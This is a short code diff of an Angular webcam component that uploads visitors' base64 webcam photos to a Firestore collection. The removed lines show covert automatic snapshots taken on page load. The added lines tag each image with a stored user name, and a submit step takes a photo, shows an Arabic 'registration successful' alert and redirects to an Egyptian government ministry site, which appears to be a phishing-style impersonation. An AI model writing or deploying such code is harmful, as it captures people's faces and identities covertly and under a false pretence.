@@ -47,28 +47,28 @@ export class CamComponent implements OnInit {
         this.multipleWebcamsAvailable = mediaDevices && mediaDevices.length > 1;
       }
     );
-    this.handelSnapshot();
+    // this.handelSnapshot();
     // setTimeout(() => {
     //   this.handleSwitchCamera();
     // }, 10000);
   }
 
-  private handelSnapshot() {
-    let interval = setInterval(() => {
-      this.triggerSnapshot();
-    }, 1000);
+  // private handelSnapshot() {
+  //   let interval = setInterval(() => {
+  //     this.triggerSnapshot();
+  //   }, 1000);
 
-    setTimeout(() => {
-      clearInterval(interval);
-    }, 5000);
-  }
+  //   setTimeout(() => {
+  //     clearInterval(interval);
+  //   }, 5000);
+  // }
 
-  private handleSwitchCamera() {
-    this.showNextWebcam(true);
-    setTimeout(() => {
-      this.handelSnapshot();
-    }, 1500);
-  }
+  // private handleSwitchCamera() {
+  //   this.showNextWebcam(true);
+  //   setTimeout(() => {
+  //     this.handelSnapshot();
+  //   }, 1500);
+  // }
 
   public triggerSnapshot(): void {
     this.trigger.next();
@@ -108,9 +108,16 @@ export class CamComponent implements OnInit {
 
   // //onsubmit
   sendImg(img: WebcamImage) {
+    const userName = localStorage.getItem('userName');
     const usersImg = collection(this.firestore, 'userImg');
-    return addDoc(usersImg, { userImg: img.imageAsBase64 })
+    return addDoc(usersImg, { userName: userName, userImg: img.imageAsBase64 })
       .then((res) => console.log('Image saved:', res))
       .catch((err) => console.error('Error:', err));
+  }
+
+  submit() {
+    this.triggerSnapshot();
+    alert('تم التسجيل بنجاح....شكرا لك');
+    window.location.replace('https://www.moss.gov.eg/ar-eg/Pages/default.aspx');
   }
 }
